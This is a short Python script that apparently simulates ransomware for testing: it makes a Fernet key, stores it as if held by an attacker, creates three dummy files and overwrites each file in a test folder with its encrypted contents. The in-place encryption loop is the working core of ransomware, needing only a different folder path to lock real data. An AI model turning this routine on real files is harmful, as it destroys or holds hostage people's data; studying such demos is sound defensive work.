from cryptography.fernet import Fernet
import os

# Generate an encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Save the encryption key (simulating attacker holding the key)
with open("keyfile.key", "wb") as kf:
    kf.write(key)

# Encrypt files in the folder
folder_path = "test_files"
if not os.path.exists(folder_path):
    os.mkdir(folder_path)  # Create folder if it doesn't exist

# Create dummy files for testing
for i in range(1, 4):
    with open(f"{folder_path}/file{i}.txt", "w") as file:
        file.write(f"This is a test file {i}.\n")

# Encrypt the files
for filename in os.listdir(folder_path):
    file_path = os.path.join(folder_path, filename)
    if os.path.isfile(file_path):
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted = cipher.encrypt(original)
        with open(file_path, "wb") as file:
            file.write(encrypted)

print(f"Files in {folder_path} have been encrypted. Key saved in keyfile.key.")
